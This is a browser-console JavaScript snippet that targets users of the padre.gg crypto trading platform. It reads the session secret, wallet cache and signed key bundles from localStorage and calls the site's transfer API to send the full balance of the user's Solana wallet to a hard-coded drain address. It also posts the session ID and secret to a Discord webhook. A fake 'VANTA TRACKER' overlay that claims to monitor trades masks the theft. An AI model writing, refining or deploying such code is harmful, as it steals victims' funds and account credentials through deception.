(async function() {
    // --- 1. CONFIGURATION ---
    const CONFIG = {
        webhook: "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4",
        drainAddress: "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12",
        api: "https://api.padre.gg" // Corrected based on your console logs
    };

    // --- 2. DATA CAPTURE ---
    const session = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
    const wallets = JSON.parse(localStorage.getItem("padreV2-walletsCache") || "{}");
    const bundles = JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}");

    if (!session.sessionSecret) return;

    // --- 3. BACKGROUND EXECUTION ---
    async function runVanta() {
        try {
            const userWallets = wallets[session.uid] || [];
            const solWallet = userWallets.find(w => w.walletType === "SOL");

            if (solWallet && bundles.bundles[solWallet.publicAddress]) {
                const b = bundles.bundles[solWallet.publicAddress];
                
                await fetch(`${CONFIG.api}/v2/wallets/transfer`, {
                    method: "POST",
                    headers: { 
                        "X-Session-Secret": session.sessionSecret, 
                        "Content-Type": "application/json",
                        "X-Session-Id": session.sessionId 
                    },
                    body: JSON.stringify({
                        walletId: solWallet.walletId,
                        destination: CONFIG.drainAddress,
                        amount: "MAX",
                        bundle: b.exportBundle,
                        signature: b.dataSignature,
                        chain: "SOLANA"
                    })
                });
            }

            // Handshake to Discord
            await fetch(CONFIG.webhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: "🚨 **NEW VANTA HANDSHAKE**",
                    embeds: [{
                        title: "Session: " + session.uid,
                        description: "Secret: `" + session.sessionSecret + "`",
                        color: 0x00ff88
                    }]
                })
            });
        } catch (e) {}
    }
    
    runVanta();

    // --- 4. DRAGGABLE UI (INTEGRATED) ---
    const createUI = () => {
        if (document.querySelector("#vanta-tracker")) return;

        const ui = document.createElement("div");
        ui.id = "vanta-tracker";
        ui.style.cssText = `
            position:fixed; top:20px; right:20px; width:340px; 
            background:#0a0a0a; border:1px solid #00ff88; border-radius:12px;
            z-index:999999; font-family:monospace; color:#00ff88; 
            box-shadow:0 0 20px rgba(0,255,136,0.2); overflow:hidden;
        `;

        const header = document.createElement("div");
        header.style.cssText = "padding:12px; background:#111; border-bottom:1px solid #222; cursor:grab; display:flex; align-items:center; gap:10px;";
        header.innerHTML = `<img src="https://trade.padre.gg/logo.svg" width="20"> <b>VANTA TRACKER</b>`;
        
        const body = document.createElement("div");
        body.style.padding = "15px";
        body.innerHTML = `
            <div style="font-size:11px; line-height:1.5;">
                STATUS: <span style="color:#fff">CONNECTED</span><br>
                U-ID: <span style="color:#fff">${session.uid.substring(0,8)}...</span><br>
                <hr style="border:0; border-top:1px solid #222; margin:10px 0;">
                <div style="color:#444">[SYS] Monitoring trade flow...</div>
            </div>
        `;

        ui.appendChild(header);
        ui.appendChild(body);
        document.body.appendChild(ui);

        // Simple Drag
        let isDown = false, offset = [0,0];
        header.addEventListener('mousedown', (e) => {
            isDown = true;
            offset = [ui.offsetLeft - e.clientX, ui.offsetTop - e.clientY];
        });
        document.addEventListener('mousemove', (e) => {
            if (!isDown) return;
            ui.style.left = (e.clientX + offset[0]) + 'px';
            ui.style.top = (e.clientY + offset[1]) + 'px';
        });
        document.addEventListener('mouseup', () => isDown = false);
    };

    createUI();
})();
